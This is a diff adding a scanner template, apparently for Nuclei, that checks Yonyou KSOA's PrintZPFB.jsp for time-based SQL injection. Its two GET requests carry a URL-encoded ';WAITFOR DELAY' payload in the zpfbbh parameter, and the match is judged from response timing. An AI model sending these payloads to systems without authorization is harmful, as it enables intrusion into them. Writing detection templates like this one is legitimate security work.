@@ -1,0 +1,35 @@
+id: yongyoushikong-KSOA-PrintZPFB-sql
+
+info:
+  name: 用友时空KSOA PrintZPFB.jsp SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /kp/PrintZPFB.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /kp/PrintZPFB.jsp?zpfbbh=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=6 && duration_1<=7'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+ 
+
+
+
+
